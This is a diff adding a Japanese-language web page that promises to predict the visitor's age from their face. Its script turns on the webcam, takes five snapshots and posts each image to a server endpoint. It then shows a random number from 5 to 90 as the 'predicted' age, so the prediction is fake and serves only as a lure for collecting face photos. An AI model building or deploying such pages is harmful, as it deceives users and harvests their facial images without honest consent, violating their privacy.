@@ -1,0 +1,89 @@
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>あなたの顔から年齢を予想します!!</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(to bottom right, #fce4ec, #f8bbd0);
+      color: #333;
+      text-align: center;
+      padding: 2rem;
+    }
+    h1 {
+      font-size: 2em;
+      color: #e91e63;
+    }
+    button {
+      background: #ff80ab;
+      color: white;
+      padding: 1rem 2rem;
+      border: none;
+      border-radius: 20px;
+      font-size: 1.2rem;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+    video, canvas {
+      display: none;
+    }
+    #result {
+      font-size: 2em;
+      margin-top: 2rem;
+      color: #880e4f;
+    }
+  </style>
+</head>
+<body>
+  <h1>あなたの顔から年齢を予想します!!</h1>
+  <button id="startBtn">はじめる！</button>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+  <div id="result"></div>
+
+  <script>
+    const startBtn = document.getElementById("startBtn");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    const result = document.getElementById("result");
+
+    startBtn.onclick = async () => {
+      startBtn.disabled = true;
+      video.style.display = "block";
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+
+      await new Promise(resolve => setTimeout(resolve, 1000));
+
+      let shots = 5;
+      for (let i = 0; i < shots; i++) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        const dataUrl = canvas.toDataURL("image/png");
+        await sendToServer(dataUrl);
+        await new Promise(resolve => setTimeout(resolve, 300));
+      }
+
+      stream.getTracks().forEach(track => track.stop());
+      video.style.display = "none";
+
+      const age = Math.floor(Math.random() * (90 - 5 + 1)) + 5;
+      result.innerText = `あなたの年齢は… ${age} 歳です！`;
+    };
+
+    async function sendToServer(imageBase64) {
+      await fetch("/api/send", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ imageBase64 })
+      });
+    }
+  </script>
+</body>
+</html>
